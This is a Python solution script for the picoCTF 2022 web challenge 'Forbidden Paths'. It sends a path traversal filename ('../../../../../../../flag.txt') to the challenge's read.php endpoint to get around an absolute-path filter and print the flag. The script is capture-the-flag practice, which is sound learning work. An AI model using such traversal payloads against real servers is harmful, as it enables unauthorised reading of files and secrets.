# Solution to picoCTF challenge Forbidden Paths.

# Tags:
# 200 points
# picoCTF 2022
# Web exploitation

# Description:
"""
Can you get the flag?
Here's the website.
We know that the website files live in /usr/share/nginx/html/
and the flag is at /flag.txt but the website is filtering absolute file paths. 
Can you get past the filter to read the flag?
"""

import requests
import re

URL = "http://saturn.picoctf.net:52683/"

response = requests.get(URL)
post_url = URL + "read.php"

print(f"Requesting {URL}")
print("-" * 20)
print(response.text)
print("-" * 20)
mydict = {'filename': '../../../../../../../flag.txt'}
print(f"Let's send a POST request to {post_url} with filename set to {mydict['filename']}.")
post = requests.post(post_url, mydict)
print("-" * 20)
print(post.text)
print("-" * 20)
flag = ''.join(re.findall("picoCTF{.*}", post.text))
print(f"The flag is: {flag}")